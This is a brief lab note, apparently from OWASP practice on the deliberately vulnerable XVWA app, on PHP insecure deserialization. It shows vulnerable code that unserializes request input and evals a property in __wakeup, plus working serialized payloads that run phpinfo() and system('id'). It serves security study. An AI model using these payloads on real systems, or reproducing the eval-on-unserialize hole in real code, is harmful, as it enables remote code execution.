# A8 - Insecure Deserialization


## XVWA

Target url:

`/xvwa/vulnerabilities/php_object_injection/?r=a:2:{i:0;s:4:%22XVWA%22;i:1;s:33:%22Xtreme%20Vulnerable%20Web%20Application%22;}`

Vulnerable code:

```
<?php 
    error_reporting(E_ALL);
    class PHPObjectInjection{
        public $inject;

        function __construct(){

        }

        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
//?r=a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
    if(isset($_REQUEST['r'])){  

        $var1=unserialize($_REQUEST['r']);
        

        if(is_array($var1)){ 
            echo "
".$var1[0]." - ".$var1[1];
        }
    }else{
        echo "parameter is missing";
    }
?>
```

PHP Code injection

`O:18:"PHPObjectInjection":1:{s:6:"inject";s:10:"phpinfo();";}`

without restrictions

`O:18:"PHPObjectInjection":1:{s:6:"inject";s:13:"system('id');";}`

`O:18:%22PHPObjectInjection%22:1:{s:6:%22inject%22;s:13:%22system(%27id%27);%22;}`

